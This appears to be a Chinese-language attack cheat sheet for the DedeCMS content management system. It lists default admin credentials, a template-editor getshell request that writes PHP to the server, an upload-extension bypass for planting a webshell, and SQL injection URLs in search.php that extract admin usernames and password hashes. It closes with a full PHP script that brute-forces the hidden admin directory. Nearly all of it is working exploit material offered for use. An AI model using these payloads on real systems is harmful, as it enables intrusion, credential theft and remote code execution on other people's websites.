# Dedecms_rce

---
通用：
```
默认账号密码：admin/admin
默认路径dede，如果不是可以看rebots.txt 
```
Dedecms RCE扫描器

```
https://github.com/lengjibo/dedecmscan
```

判断模板日期(将日期和dedecms去搜索即可知道版本)

```
/data/admin/ver.txt
```

DedeCMSV57_UTF8_SP2  getshell

```
   前提获取管理员登陆账号密码，在登陆状态下
   1.获取token访问
   /dede/tpl.php?action=upload
   2.定义上传文件
   /dede/tpl.php?filename=ichunqiu.lib.php&action=savetagfile&content=%3C?php%20phpinfo();?%3E&token=【这里是你的token值】
   3.访问上传的文件
   /include/taglib/ichunqiu.lib.php
```

后台传马

```
/include/dialog/select_soft_post.php
上传x.jpg 改包x.jpg.p*hp
返回上传路径即可
PS：* % ？ <> : 均可以绕过
```

前台(判断是否有会员中心功能开启)

```
/member/index.php?uid=001
```

DedeCMSV57_UTF8_SP2  前台注入

```
/plus/search.php?keyword=as&typeArr[ uNion ]=a

如果报错：Safe Alert: Request Error step 2 !
/plus/search.php?keyword=as&typeArr[111%3D@`\'`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+`%23@__admin`%23@`\'`+]=a

如果报错：Safe Alert: Request Error step 1 !
/plus/search.php?keyword=as&typeArr[111%3D@`\'`)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`\'`+]=a


/plus/search.php/plus/search.php?keyword=as&typeArr[111%3D@`\%27`)+and+updatexml(1,concat(0x7e,substr((select%20pwd%20from%20dede_member%20limit%200,1),1,32),0x7e),0)%23@`\%27`+]=a

dede_member 会员表第一个账号是管理员
dede_admin  管理员表

```

找后台：http://www.91ri.org/17605.html

```
php.exe getdede.php

getdede.php-------
<?php
$domain='http://localhost/dedecms/';
$url=$domain.'/index.php';
function post($url, $data, $cookie = '') {
    $options = array(
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER => true,
        CURLOPT_POST => true,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_COOKIE => $cookie,
        CURLOPT_POSTFIELDS => $data,
    );
    $ch = curl_init($url);
    curl_setopt_array($ch, $options);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
$testlen=25;
$str=range('a','z');
$number=range(0,9,1);
$dic = array_merge($str, $number);
$n=true;
$nn=true;
$path='';
while($n){
    foreach($dic as $v){
        foreach($dic as $vv){
            #echo $v.$vv .'----';
            $post_data="dopost=save&_FILES[b4dboy][tmp_name]=./$v$vv</images/admin_top_logo.gif&_FILES[b4dboy][name]=0&_FILES[b4dboy][size]=0&_FILES[b4dboy][type]=image/gif";
            $result=post($url,$post_data);
            if(strpos($result,'Upload filetype not allow !') === false){
                $path=$v.$vv;$n=false;break 2;
            }
        }
    }
}
while($nn){
    foreach($dic as $vvv){
        $post_data="dopost=save&_FILES[b4dboy][tmp_name]=./$path$vvv</images/admin_top_logo.gif&_FILES[b4dboy][name]=0&_FILES[b4dboy][size]=0&_FILES[b4dboy][type]=image/gif";
        $result=post($url,$post_data);
        if(strpos($result,'Upload filetype not allow !') === false){
            $path.=$vvv;
            echo $path . PHP_EOL;
            $giturl=$domain.'/'.$path.'/images/admin_top_logo.gif';
            if(@file_get_contents($giturl)){
                echo $domain.'/'.$path.'/';
                $nn=false;break 2;
            }
        }
    }
}
?>
```

